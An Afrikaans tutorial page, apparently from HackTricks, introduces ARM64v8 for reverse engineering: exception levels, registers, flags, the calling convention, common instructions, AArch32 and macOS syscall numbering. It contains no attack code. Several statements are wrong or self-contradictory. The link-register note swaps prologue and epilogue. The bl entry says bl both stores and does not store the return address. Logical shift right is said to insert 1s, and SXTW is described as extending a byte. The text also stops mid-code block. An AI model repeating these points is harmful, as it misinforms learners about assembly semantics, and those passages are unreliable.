# Inleiding tot ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

In ARMv8-argitektuur definieer uitvoeringsvlakke, bekend as Exception Levels (ELs), die bevoorregtingsvlak en vermoëns van die uitvoeringsomgewing. Daar is vier exception levels, van EL0 tot EL3, en elkeen dien ’n ander doel:

1. **EL0 - User Mode**:
- Dit is die vlak met die minste voorregte en word gebruik om gewone application code uit te voer.
- Applications wat by EL0 loop, word van mekaar en van die system software geïsoleer, wat sekuriteit en stabiliteit verbeter.
2. **EL1 - Operating System Kernel Mode**:
- Die meeste operating system kernels loop op hierdie vlak.
- EL1 het meer voorregte as EL0 en kan toegang tot system resources verkry, maar met sekere beperkings om system integrity te verseker. Jy gaan van EL0 na EL1 met die SVC-instruction.
3. **EL2 - Hypervisor Mode**:
- Hierdie vlak word vir virtualisation gebruik. ’n Hypervisor wat by EL2 loop, kan verskeie operating systems bestuur (elk in sy eie EL1) wat op dieselfde fisiese hardware loop.
- EL2 verskaf features vir isolasie en beheer van die gevirtualiseerde environments.
- Virtual machine applications soos Parallels kan dus die `hypervisor.framework` gebruik om met EL2 te kommunikeer en virtual machines te laat loop sonder kernel extensions.
- Om van EL1 na EL2 te beweeg, word die `HVC`-instruction gebruik.
4. **EL3 - Secure Monitor Mode**:
- Dit is die vlak met die meeste voorregte en word dikwels vir secure booting en trusted execution environments gebruik.
- EL3 kan toegang tussen secure en non-secure states bestuur en beheer (soos secure boot, trusted OS, ens.).
- Dit is vir KPP (Kernel Patch Protection) in macOS gebruik, maar word nie meer gebruik nie.
- EL3 word nie meer deur Apple gebruik nie.
- Die oorgang na EL3 word tipies met die `SMC` (Secure Monitor Call)-instruction gedoen.

Die gebruik van hierdie vlakke bied ’n gestruktureerde en veilige manier om verskillende aspekte van die system te bestuur, van user applications tot die mees bevoorregte system software. ARMv8 se benadering tot privilege levels help om verskillende system components effektief te isoleer en verbeter sodoende die sekuriteit en robuustheid van die system.

## **Registers (ARM64v8)**

ARM64 het **31 general-purpose registers**, gemerk `x0` tot `x30`. Elkeen kan ’n **64-bit** (8-byte) waarde stoor. Vir operasies wat slegs 32-bit-waardes benodig, kan dieselfde registers in ’n 32-bit-modus verkry word met die name w0 tot w30.

1. **`x0`** tot **`x7`** - Hierdie word tipies as scratch registers en vir die oordrag van parameters na subroutines gebruik.
- **`x0`** bevat ook die return data van ’n function
2. **`x8`** - In die Linux kernel word `x8` as die system call number vir die `svc`-instruction gebruik. **In macOS is x16 die een wat gebruik word!**
3. **`x9`** tot **`x15`** - Verdere temporary registers, wat dikwels vir local variables gebruik word.
4. **`x16`** en **`x17`** - **Intra-procedural Call Registers**. Temporary registers vir immediate values. Hulle word ook vir indirect function calls en PLT (Procedure Linkage Table) stubs gebruik.
- **`x16`** word as die **system call number** vir die **`svc`**-instruction in **macOS** gebruik.
5. **`x18`** - **Platform register**. Dit kan as ’n general-purpose register gebruik word, maar op sommige platforms is hierdie register vir platform-specific uses gereserveer: Pointer na die huidige thread environment block in Windows, of om na die tans **executing task structure in linux kernel** te wys.
6. **`x19`** tot **`x28`** - Hierdie is callee-saved registers. ’n Function moet hierdie registers se waardes vir sy caller behou, en daarom word hulle in die stack gestoor en herstel voordat na die caller teruggekeer word.
7. **`x29`** - **Frame pointer** om die stack frame te volg. Wanneer ’n nuwe stack frame geskep word omdat ’n function geroep word, word die **`x29`**-register **in die stack gestoor** en die adres van die **nuwe** frame pointer (die **`sp`**-adres) word **in hierdie register** gestoor.
- Hierdie register kan ook as ’n **general-purpose register** gebruik word, hoewel dit gewoonlik as verwysing na **local variables** gebruik word.
8. **`x30`** of **`lr`**- **Link register**. Dit bevat die **return address** wanneer ’n `BL` (Branch with Link)- of `BLR` (Branch with Link to Register)-instruction uitgevoer word deur die **`pc`**-waarde in hierdie register te stoor.
- Dit kan ook soos enige ander register gebruik word.
- As die huidige function ’n nuwe function gaan oproep en dus `lr` gaan oorskryf, sal dit dit aan die begin in die stack stoor; dit is die epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` en `lr`, skep spasie en verkry nuwe `fp`) en dit aan die einde herstel; dit is die prologue (`ldp x29, x30, [sp], #48; ret` -> Herstel `fp` en `lr` en return).
9. **`sp`** - **Stack pointer**, wat gebruik word om die bokant van die stack te volg.
- Die **`sp`**-waarde moet altyd ten minste ’n **quadword**-**alignment** hê, anders kan ’n alignment exception voorkom.
10. **`pc`** - **Program counter**, wat na die volgende instruction wys. Hierdie register kan slegs deur exception generations, exception returns en branches opgedateer word. Die enigste gewone instructions wat hierdie register kan lees, is branch with link instructions (BL, BLR), wat die **`pc`**-adres in **`lr`** (Link Register) stoor.
11. **`xzr`** - **Zero register**. Dit word ook **`wzr`** in sy **32**-bit-registervorm genoem. Dit kan gebruik word om maklik die zero value te verkry (’n algemene operasie), of om comparisons met **`subs`** uit te voer, soos **`subs XZR, Xn, #10`**, wat die resultaat nêrens stoor nie (in **`xzr`**).

Die **`Wn`**-registers is die **32-bit**-weergawe van die **`Xn`**-register.

> [!TIP]
> Die registers van X0 - X18 is volatile, wat beteken dat hul waardes deur function calls en interrupts verander kan word. Die registers van X19 - X28 is egter non-volatile, wat beteken dat hul waardes oor function calls heen behoue moet bly ("callee saved").

### SIMD and Floating-Point Registers

Daarbenewens is daar nog **32 registers met ’n lengte van 128 bit** wat in geoptimaliseerde single instruction multiple data (SIMD)-operasies en vir floating-point arithmetic gebruik kan word. Hulle word die Vn-registers genoem, hoewel hulle ook in **64**-bit-, **32**-bit-, **16**-bit- en **8**-bit-modusse kan werk; dan word hulle **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** en **`Bn`** genoem.

### System Registers

**Daar is honderde system registers**, ook bekend as special-purpose registers (SPRs), wat gebruik word om die gedrag van **processors** te **monitor** en te **beheer**.\
Hulle kan slegs met die toegewyde special instructions **`mrs`** en **`msr`** gelees of gestel word.

Die special registers **`TPIDR_EL0`** en **`TPIDDR_EL0`** word dikwels tydens reverse engineering aangetref. Die `EL0`-suffix dui die **minimal exception level** aan waarvandaan die register verkry kan word (in hierdie geval is EL0 die gewone exception- (privilege-) level waarmee gewone programme loop).\
Hulle word dikwels gebruik om die **base address van die thread-local storage**-geheuegebied te stoor. Gewoonlik is die eerste een leesbaar en skryfbaar vir programme wat in EL0 loop, maar die tweede een kan vanaf EL0 gelees en vanaf EL1 (soos die kernel) geskryf word.

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** bevat verskeie process components wat in die operating-system-visible **`SPSR_ELx`**-special register geserialiseer word, waar X die **permission** **level van die triggered** exception is (dit maak dit moontlik om die process state te herstel wanneer die exception eindig).\
Hierdie velde is toeganklik:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Die **`N`**, **`Z`**, **`C`** en **`V`** condition flags:
- **`N`** beteken dat die operasie ’n negatiewe resultaat gelewer het.
- **`Z`** beteken dat die operasie zero gelewer het.
- **`C`** beteken dat die operasie ’n carry gehad het.
- **`V`** beteken dat die operasie ’n signed overflow gelewer het:
- Die som van twee positiewe getalle lewer ’n negatiewe resultaat.
- Die som van twee negatiewe getalle lewer ’n positiewe resultaat.
- In subtraction, wanneer ’n groot negatiewe getal van ’n kleiner positiewe getal afgetrek word (of andersom), en die resultaat nie binne die reeks van die gegewe bit-grootte voorgestel kan word nie.
- Uiteraard weet die processor nie of die operasie signed of nie-signed is nie; daarom kontroleer dit C en V in die operasies en dui dit aan of ’n carry plaasgevind het, ongeag of dit signed of unsigned was.

> [!WARNING]
> Nie al die instructions dateer hierdie flags op nie. Sommige, soos **`CMP`** of **`TST`**, doen dit, en ander met ’n s-suffix, soos **`ADDS`**, doen dit ook.

- Die huidige **register width (`nRW`) flag**: As die flag die waarde 0 bevat, sal die program in die AArch64 execution state loop wanneer dit hervat word.
- Die huidige **Exception Level** (**`EL`**): ’n Gewone program wat in EL0 loop, sal die waarde 0 hê.
- Die **single stepping**-flag (**`SS`**): Word deur debuggers gebruik om single-step uit te voer deur die SS-flag binne **`SPSR_ELx`** via ’n exception op 1 te stel. Die program sal een step uitvoer en ’n single-step exception genereer.
- Die **illegal exception**-state flag (**`IL`**): Dit word gebruik om te merk wanneer bevoorregte software ’n ongeldige exception level transfer uitvoer; hierdie flag word op 1 gestel en die processor aktiveer ’n illegal state exception.
- Die **`DAIF`**-flags: Hierdie flags laat ’n bevoorregte program toe om sekere external exceptions selektief te mask.
- As **`A`** 1 is, beteken dit dat **asynchronous aborts** geaktiveer sal word. Die **`I`** konfigureer reaksie op external hardware **Interrupts Requests** (IRQs), en die F hou verband met **Fast Interrupt Requests** (FIRs).
- Die **stack pointer select**-flags (**`SPS`**): Bevoorregte programme wat in EL1 en hoër loop, kan wissel tussen hul eie stack pointer-register en die user-model een (byvoorbeeld tussen `SP_EL1` en `EL0`). Hierdie wisseling word uitgevoer deur na die **`SPSel`**-special register te skryf. Dit kan nie vanaf EL0 gedoen word nie.

## **Calling Convention (ARM64v8)**

Die ARM64 calling convention spesifiseer dat die **eerste agt parameters** van ’n function in registers **`x0`** tot **`x7`** oorgedra word. **Additional** parameters word op die **stack** oorgedra. Die **return**-waarde word in register **`x0`** teruggegee, of ook in **`x1`** **as dit 128 bit lank is**. Die **`x19`** tot **`x30`**- en **`sp`**-registers moet oor function calls heen **preserved** word.

Wanneer ’n function in assembly gelees word, soek na die **function prologue en epilogue**. Die **prologue** behels gewoonlik die **saving van die frame pointer (`x29`)**, die **opstel** van ’n **nuwe frame pointer** en die **toewysing van stack space**. Die **epilogue** behels gewoonlik die **herstel van die saved frame pointer** en die **return** uit die function.

### Calling Convention in Swift

Swift het sy eie **calling convention**, wat in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) gevind kan word.

## **Common Instructions (ARM64v8)**

ARM64-instructions het gewoonlik die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die operasie is wat uitgevoer moet word (soos `add`, `sub`, `mov`, ens.), **`dst`** die **destination**-register is waar die resultaat gestoor word, en **`src1`** en **`src2`** die **source**-registers is. Immediate values kan ook in die plek van source registers gebruik word.

- **`mov`**: **Move** ’n waarde van een **register** na ’n ander.
- Voorbeeld: `mov x0, x1` — Dit skuif die waarde van `x1` na `x0`.
- **`ldr`**: **Load** ’n waarde uit **memory** in ’n **register**.
- Voorbeeld: `ldr x0, [x1]` — Dit laai ’n waarde vanaf die memory location waarna `x1` wys, in `x0`.
- **Offset mode**: ’n Offset wat die origin pointer beïnvloed, word byvoorbeeld aangedui deur:
- `ldr x2, [x1, #8]`, dit laai die waarde van x1 + 8 in x2.
- `ldr x2, [x0, x1, lsl #2]`, dit laai ’n object uit die array x0 in x2, vanaf posisie x1 (index) \* 4.
- **Pre-indexed mode**: Dit pas calculations op die origin toe, verkry die resultaat en stoor ook die nuwe origin in die origin.
- `ldr x2, [x1, #8]!`, dit laai `x1 + 8` in `x2` en stoor die resultaat van `x1 + 8` in x1.
- `str lr, [sp, #-4]!`, Stoor die link register in sp en dateer die register sp op.
- **Post-index mode**: Dit is soos die vorige een, maar die memory address word verkry en daarna word die offset bereken en gestoor.
- `ldr x0, [x1], #8`, laai `x1` in `x0` en dateer x1 op met `x1 + 8`.
- **PC-relative addressing**: In hierdie geval word die address wat gelaai moet word relatief tot die PC-register bereken.
- `ldr x1, =_start`, Dit laai die address waar die `_start`-symbol begin in x1, relatief tot die huidige PC.
- **`str`**: **Store** ’n waarde vanaf ’n **register** in **memory**.
- Voorbeeld: `str x0, [x1]` — Dit stoor die waarde in `x0` in die memory location waarna `x1` wys.
- **`ldp`**: **Load Pair of Registers**. Hierdie instruction **laai twee registers** vanaf **opeenvolgende memory**-locations. Die memory address word gewoonlik gevorm deur ’n offset by die waarde in ’n ander register te tel.
- Voorbeeld: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` vanaf die memory locations by onderskeidelik `x2` en `x2 + 8`.
- **`stp`**: **Store Pair of Registers**. Hierdie instruction **stoor twee registers** in **opeenvolgende memory**-locations. Die memory address word gewoonlik gevorm deur ’n offset by die waarde in ’n ander register te tel.
- Voorbeeld: `stp x0, x1, [sp]` — Dit stoor `x0` en `x1` in die memory locations by onderskeidelik `sp` en `sp + 8`.
- `stp x0, x1, [sp, #16]!` — Dit stoor `x0` en `x1` in die memory locations by onderskeidelik `sp+16` en `sp + 24`, en dateer `sp` op met `sp+16`.
- **`add`**: **Tel** die waardes van twee registers bymekaar en stoor die resultaat in ’n register.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operando 2 (register of immediate)
- \[shift #N | RRX] -> Voer ’n shift uit of roep RRX aan.
- Voorbeeld: `add x0, x1, x2` — Dit tel die waardes in `x1` en `x2` bymekaar en stoor die resultaat in `x0`.
- `add x5, x5, #1, lsl #12` — Dit is gelyk aan 4096 (’n 1 wat 12 keer geshift word) -> 1 0000 0000 0000 0000
- **`adds`** Hierdie voer ’n `add` uit en dateer die flags op.
- **`sub`**: **Trek** die waardes van twee registers van mekaar af en stoor die resultaat in ’n register.
- Sien **`add`** se **syntax**.
- Voorbeeld: `sub x0, x1, x2` — Dit trek die waarde in `x2` van `x1` af en stoor die resultaat in `x0`.
- **`subs`** Dit is soos sub, maar dateer die flags op.
- **`mul`**: **Vermenigvuldig** die waardes van **twee registers** en stoor die resultaat in ’n register.
- Voorbeeld: `mul x0, x1, x2` — Dit vermenigvuldig die waardes in `x1` en `x2` en stoor die resultaat in `x0`.
- **`div`**: **Deel** die waarde van een register deur ’n ander en stoor die resultaat in ’n register.
- Voorbeeld: `div x0, x1, x2` — Dit deel die waarde in `x1` deur `x2` en stoor die resultaat in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Voeg 0s aan die einde by en skuif die ander bits vorentoe (vermenigvuldig met n keer 2).
- **Logical shift right**: Voeg 1s aan die begin by en skuif die ander bits agtertoe (deel deur n keer 2 in unsigned).
- **Arithmetic shift right**: Soos **`lsr`**, maar in plaas daarvan om 0s by te voeg, word **1s bygevoeg as die most significant bit ’n 1 is** (deel deur n keer 2 in signed).
- **Rotate right**: Soos **`lsr`**, maar wat ook al van regs verwyder word, word links aangeheg.
- **Rotate Right with Extend**: Soos **`ror`**, maar met die carry flag as die "most significant bit". Die carry flag word dus na bit 31 geskuif en die verwyderde bit na die carry flag.
- **`bfm`**: **Bit Field Move**; hierdie operasies **kopieer bits `0...n`** vanaf ’n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **leftmost bit**-posisie en **`#r`** die rotate right amount.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopieer ’n bitfield vanaf ’n register en kopieer dit na ’n ander register.
- **`BFI X1, X2, #3, #4`** Voeg 4 bits vanaf X2 in, vanaf die 3de bit van X1.
- **`BFXIL X1, X2, #3, #4`** Onttrek vier bits vanaf die 3de bit van X2 en kopieer hulle na X1.
- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits vanaf X2 en voeg hulle by X1 in, beginnende by bit-posisie 3, terwyl die regter bits op zero gestel word.
- **`SBFX X1, X2, #3, #4`** Onttrek 4 bits wat by bit 3 vanaf X2 begin, sign-extends hulle en plaas die resultaat in X1.
- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits vanaf X2 en voeg hulle by X1 in, beginnende by bit-posisie 3, terwyl die regter bits op zero gestel word.
- **`UBFX X1, X2, #3, #4`** Onttrek 4 bits wat by bit 3 vanaf X2 begin en plaas die zero-extended resultaat in X1.
- **Sign Extend To X:** Brei die sign van ’n waarde uit (of voeg slegs 0s in die unsigned-weergawe by) om operasies daarmee te kan uitvoer:
- **`SXTB X1, W2`** Brei die sign van ’n byte **van W2 na X1** uit (`W2` is die helfte van `X2`) om die 64 bits te vul.
- **`SXTH X1, W2`** Brei die sign van ’n 16-bit-getal **van W2 na X1** uit om die 64 bits te vul.
- **`SXTW X1, W2`** Brei die sign van ’n byte **van W2 na X1** uit om die 64 bits te vul.
- **`UXTB X1, W2`** Voeg 0s (unsigned) by ’n byte **van W2 na X1** om die 64 bits te vul.
- **`extr`:** Onttrek bits vanaf ’n gespesifiseerde **paar registers wat aaneengeskakel is**.
- Voorbeeld: `EXTR W3, W2, W1, #3` Dit sal **W1+W2 aaneenskakel** en **vanaf bit 3 van W2 tot by bit 3 van W1** verkry en dit in W3 stoor.
- **`cmp`**: **Vergelyk** twee registers en stel condition flags. Dit is ’n **alias van `subs`** wat die destination register op die zero register stel. Nuttig om te weet of `m == n`.
- Dit ondersteun dieselfde syntax as `subs`.
- Voorbeeld: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die condition flags dienooreenkomstig.
- **`cmn`**: **Compare negative** operand. In hierdie geval is dit ’n **alias van `adds`** en ondersteun dit dieselfde syntax. Nuttig om te weet of `m == -n`.
- **`ccmp`**: Conditional comparison; dit is ’n comparison wat slegs uitgevoer word as ’n vorige comparison waar was, en dit stel spesifiek die nzcv-bits.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> as x1 != x2 en x3 < x4, spring na func.
- Dit is omdat **`ccmp`** slegs uitgevoer sal word as die **vorige `cmp` ’n `NE` was**. Indien nie, word die `nzcv`-bits op 0 gestel (wat nie aan die `blt`-comparison sal voldoen nie).
- Dit kan ook as `ccmn` gebruik word (dieselfde, maar negatief, soos `cmp` teenoor `cmn`).
- **`tst`**: Dit kontroleer of enige van die waardes in die comparison albei 1 is (dit werk soos ’n ANDS sonder om die resultaat enigsins te stoor). Dit is nuttig om ’n register met ’n waarde te toets en te kontroleer of enige van die register se bits wat in die waarde aangedui word, 1 is.
- Voorbeeld: `tst X1, #7` Kontroleer of enige van die laaste 3 bits van X1 1 is.
- **`teq`**: XOR-operasie wat die resultaat weggooi.
- **`b`**: Unconditional Branch.
- Voorbeeld: `b myFunction`
- Let daarop dat dit nie die link register met die return address vul nie (dus nie geskik vir subroutine calls wat moet terugkeer nie).
- **`bl`**: **Branch** with link, wat gebruik word om ’n **subroutine** te **roep**. Stoor die **return address in `x30`**.
- Voorbeeld: `bl myFunction` — Dit roep die function `myFunction` en stoor die return address in `x30`.
- Let daarop dat dit nie die link register met die return address vul nie (dus nie geskik vir subroutine calls wat moet terugkeer nie).
- **`blr`**: **Branch** with Link to Register, wat gebruik word om ’n **subroutine** te **roep** waar die target in ’n **register** gespesifiseer word. Stoor die return address in `x30`. (Dit is
- Voorbeeld: `blr x1` — Dit roep die function waarvan die address in `x1` vervat is en stoor die return address in `x30`.
- **`ret`**: **Return** vanaf ’n **subroutine**, gewoonlik deur die address in **`x30`** te gebruik.
- Voorbeeld: `ret` — Dit keer terug vanaf die huidige subroutine deur die return address in `x30` te gebruik.
- **`b.<cond>`**: Conditional branches.
- **`b.eq`**: **Branch if equal**, gebaseer op die vorige `cmp`-instruction.
- Voorbeeld: `b.eq label` — As die vorige `cmp`-instruction twee gelyke waardes gevind het, spring dit na `label`.
- **`b.ne`**: **Branch if Not Equal**. Hierdie instruction kontroleer die condition flags (wat deur ’n vorige comparison instruction gestel is), en as die vergeleke waardes nie gelyk was nie, branch dit na ’n label of address.
- Voorbeeld: Ná ’n `cmp x0, x1`-instruction, `b.ne label` — As die waardes in `x0` en `x1` nie gelyk was nie, spring dit na `label`.
- **`cbz`**: **Compare and Branch on Zero**. Hierdie instruction vergelyk ’n register met zero, en as hulle gelyk is, branch dit na ’n label of address.
- Voorbeeld: `cbz x0, label` — As die waarde in `x0` zero is, spring dit na `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Hierdie instruction vergelyk ’n register met zero, en as hulle nie gelyk is nie, branch dit na ’n label of address.
- Voorbeeld: `cbnz x0, label` — As die waarde in `x0` nie-zero is, spring dit na `label`.
- **`tbnz`**: Test bit and branch on nonzero.
- Voorbeeld: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero.
- Voorbeeld: `tbz x0, #8, label`
- **Conditional select operations**: Dit is operasies waarvan die gedrag volgens die conditional bits wissel.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Indien waar, X0 = X1; indien vals, X0 = X2.
- `csinc Xd, Xn, Xm, cond` -> Indien waar, Xd = Xn; indien vals, Xd = Xm + 1.
- `cinc Xd, Xn, cond` -> Indien waar, Xd = Xn + 1; indien vals, Xd = Xn.
- `csinv Xd, Xn, Xm, cond` -> Indien waar, Xd = Xn; indien vals, Xd = NOT(Xm).
- `cinv Xd, Xn, cond` -> Indien waar, Xd = NOT(Xn); indien vals, Xd = Xn.
- `csneg Xd, Xn, Xm, cond` -> Indien waar, Xd = Xn; indien vals, Xd = - Xm.
- `cneg Xd, Xn, cond` -> Indien waar, Xd = - Xn; indien vals, Xd = Xn.
- `cset Xd, Xn, Xm, cond` -> Indien waar, Xd = 1; indien vals, Xd = 0.
- `csetm Xd, Xn, Xm, cond` -> Indien waar, Xd = \<all 1>; indien vals, Xd = 0.
- **`adrp`**: Bereken die **page address van ’n symbol** en stoor dit in ’n register.
- Voorbeeld: `adrp x0, symbol` — Dit bereken die page address van `symbol` en stoor dit in `x0`.
- **`ldrsw`**: **Load** ’n signed **32-bit**-waarde vanaf memory en **sign-extend** dit na **64** bits. Dit word vir algemene SWITCH-cases gebruik.
- Voorbeeld: `ldrsw x0, [x1]` — Dit laai ’n signed 32-bit-waarde vanaf die memory location waarna `x1` wys, sign-extends dit na 64 bits en stoor dit in `x0`.
- **`stur`**: **Store ’n registerwaarde in ’n memory location**, met gebruik van ’n offset vanaf ’n ander register.
- Voorbeeld: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die memory address wat 4 bytes groter is as die address wat tans in `x1` is.
- **`svc`**: Maak ’n **system call**. Dit staan vir "Supervisor Call". Wanneer die processor hierdie instruction uitvoer, **skakel dit van user mode na kernel mode** en spring dit na ’n spesifieke memory location waar die **kernel se system call handling**-code geleë is.

- Voorbeeld:

```armasm
mov x8, 93  ; Laai die system call number vir exit (93) in register x8.
mov x0, 0   ; Laai die exit status code (0) in register x0.
svc 0       ; Maak die system call.
```

### **Function Prologue**

1. **Stoor die link register en frame pointer in die stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Stel die nuwe raamwyser op**: `mov x29, sp` (stel die nuwe raamwyser vir die huidige funksie op)
3. **Ken ruimte op die stack vir plaaslike veranderlikes toe** (indien nodig): `sub sp, sp, <size>` (waar `<size>` die aantal benodigde grepe is)

### **Funksie-epiloog**

1. **Deallokeer plaaslike veranderlikes (indien enige toegewys is)**: `add sp, sp, <size>`
2. **Herstel die linkregister en raamwyser**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (gee beheer terug aan die caller deur die adres in die link register te gebruik)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A ondersteun die uitvoering van 32-bit programme. **AArch32** kan in een van **twee instruction sets** loop: **`A32`** en **`T32`**, en kan tussen hulle wissel deur middel van **`interworking`**.\
**Privileged** 64-bit programme kan die **execution van 32-bit** programme skeduleer deur ’n exception level transfer na die laer privileged 32-bit-vlak uit te voer.\
Let daarop dat die oorgang van 64-bit na 32-bit plaasvind met ’n verlaging van die exception level (byvoorbeeld ’n 64-bit-program in EL1 wat ’n program in EL0 aktiveer). Dit word gedoen deur **bit 4 van** die **`SPSR_ELx`**-spesiale register **op 1 te stel** wanneer die **`AArch32`**-proses-thread gereed is om uitgevoer te word, terwyl die res van `SPSR_ELx` die **`AArch32`**-program se CPSR stoor. Daarna roep die privileged proses die **`ERET`**-instruction aan, sodat die verwerker na **`AArch32`** oorskakel en A32 of T32 binnegaan, afhangend van CPSR**.**

Die **`interworking`** vind plaas deur die J- en T-bits van CPSR te gebruik. `J=0` en `T=0` beteken **`A32`**, terwyl `J=0` en `T=1` **T32** beteken. Dit beteken basies dat die **laagste bit op 1 gestel word** om aan te dui dat die instruction set T32 is.\
Dit word tydens die **interworking branch instructions** gestel, maar kan ook direk met ander instructions gestel word wanneer die PC as die destination register gebruik word. Voorbeeld:

Nog ’n voorbeeld:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Daar is 16 32-bit registers (r0-r15). **Van r0 tot r14** kan hulle vir **enige bewerking** gebruik word, maar sommige daarvan word gewoonlik gereserveer:

- **`r15`**: Programteller (altyd). Bevat die adres van die volgende instruksie. In A32 huidige + 8, in T32 huidige + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-prosedurele call-register
- **`r13`**: Stack Pointer (Let daarop dat die stack altyd 16-byte-belyn is)
- **`r14`**: Link Register

Verder word registers in **`banked registries`** gerugsteun. Dit is plekke wat die registerwaardes stoor en **vinnige context switching** in exception handling en bevoorregte bewerkings moontlik maak, sodat dit nie nodig is om registers elke keer handmatig te stoor en te herstel nie.\
Dit word gedoen deur **die verwerker se toestand vanaf die `CPSR` na die `SPSR`** van die verwerkermodus waarheen die exception geneem word, te stoor. Wanneer die exception terugkeer, word die **`CPSR` vanaf die `SPSR`** herstel.

### CPSR - Current Program Status Register

In AArch32 werk die CPSR soortgelyk aan **`PSTATE`** in AArch64 en word dit ook in **`SPSR_ELx`** gestoor wanneer ’n exception geneem word, sodat die uitvoering later herstel kan word:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Die velde word in ’n aantal groepe verdeel:

- Application Program Status Register (APSR): Rekenkundige flags en toeganklik vanaf EL0
- Execution State Registers: Prosesgedrag (deur die OS bestuur).

#### Application Program Status Register (APSR)

- Die **`N`**, **`Z`**, **`C`**, **`V`** flags (net soos in AArch64)
- Die **`Q`** flag: Dit word op 1 gestel wanneer **integer saturation plaasvind** tydens die uitvoering van ’n gespesialiseerde saturating arithmetic-instruksie. Sodra dit op **`1`** gestel is, behou dit die waarde totdat dit handmatig op 0 gestel word. Daarbenewens is daar geen instruksie wat die waarde daarvan implisiet kontroleer nie; dit moet gedoen word deur dit handmatig te lees.
- **`GE`** (Greater than or equal)-flags: Dit word in SIMD (Single Instruction, Multiple Data)-bewerkings gebruik, soos "parallel add" en "parallel subtract". Hierdie bewerkings maak dit moontlik om verskeie datapunte in ’n enkele instruksie te verwerk.

Byvoorbeeld, die **`UADD8`**-instruksie **tel vier pare grepe by** (van twee 32-bit-operande) in parallel en stoor die resultate in ’n 32-bit-register. Dit **stel dan die `GE`-flags in die `APSR`** op grond van hierdie resultate. Elke GE-flag stem ooreen met een van die byte-addisies en dui aan of die optelling vir daardie paar grepe **oorgevloei het**.

Die **`SEL`**-instruksie gebruik hierdie GE-flags om voorwaardelike aksies uit te voer.

#### Execution State Registers

- Die **`J`**- en **`T`**-bisse: **`J`** behoort 0 te wees. As **`T`** 0 is, word die A32-instruksiestel gebruik, en as dit 1 is, word T32 gebruik.
- **IT Block State Register** (`ITSTATE`): Dit is die bisse van 10-15 en 25-26. Hulle stoor voorwaardes vir instruksies binne ’n groep met ’n **`IT`**-prefix.
- **`E`**-bis: Dui die **endianness** aan.
- **Mode and Exception Mask Bits** (0-4): Hulle bepaal die huidige uitvoeringstoestand. Die 5de een dui aan of die program as 32-bit (’n 1) of 64-bit (’n 0) loop. Die ander 4 verteenwoordig die **exception mode wat tans gebruik word** (wanneer ’n exception plaasvind en hanteer word). Die ingestelde getal **dui die huidige prioriteit aan** ingeval nog ’n exception geaktiveer word terwyl hierdie een hanteer word.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Sekere exceptions kan met die bisse **`A`**, `I`, `F` gedeaktiveer word. As **`A`** 1 is, beteken dit dat **asynchronous aborts** geaktiveer sal word. Die **`I`** stel die reaksie op eksterne hardeware-**Interrupt Requests** (IRQs) in, en die F hou verband met **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Kyk na [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) of voer `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` uit. BSD syscalls sal **x16 > 0** hê.

### Mach Traps

Kyk in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) na die `mach_trap_table` en in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) na die prototypes. Die maksimum aantal Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps sal **x16 < 0** hê, dus moet jy die nommers uit die vorige lys met ’n **minus** aanroep: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

Jy kan ook **`libsystem_kernel.dylib`** in ’n disassembler nagaan om te sien hoe om hierdie (en BSD-)syscalls aan te roep:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
